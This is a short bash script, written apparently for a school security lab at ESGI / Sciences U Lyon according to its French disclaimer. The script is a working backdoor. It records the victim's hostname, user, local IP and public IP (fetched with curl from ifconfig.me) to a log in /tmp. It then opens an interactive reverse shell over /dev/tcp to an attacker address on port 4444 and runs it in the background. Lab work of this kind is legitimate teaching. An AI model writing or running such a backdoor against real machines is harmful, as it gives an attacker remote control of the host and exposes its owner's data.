#!/bin/bash

# =====================================================
# Avertissement :
# Ce script a été conçu dans un cadre purement éducatif,
# dans le cadre d'un TP pour l'école ESGI / Sciences U Lyon.
# Toute utilisation non autorisée ou malveillante est strictement interdite.
# L’auteur décline toute responsabilité en cas d’abus.
# =====================================================

PUBIP=$(curl -s ifconfig.me)
LOCALIP=$(hostname -I | awk '{print $1}')
HOSTNAME=$(hostname)
USER=$(whoami)
DATE=$(date "+%Y-%m-%d %H:%M:%S")

LOGFILE="/tmp/usb_attack_detected.txt"
echo ">>> BACKDOOR ACTIVATED" >> "$LOGFILE"
echo "DATE: $DATE" >> "$LOGFILE"
echo "HOST: $HOSTNAME" >> "$LOGFILE"
echo "USER: $USER" >> "$LOGFILE"
echo "IP Publique: $PUBIP" >> "$LOGFILE"
echo "IP Locale: $LOCALIP" >> "$LOGFILE"

ATTACKER_IP="192.168.211.128"
ATTACKER_PORT=4444

bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
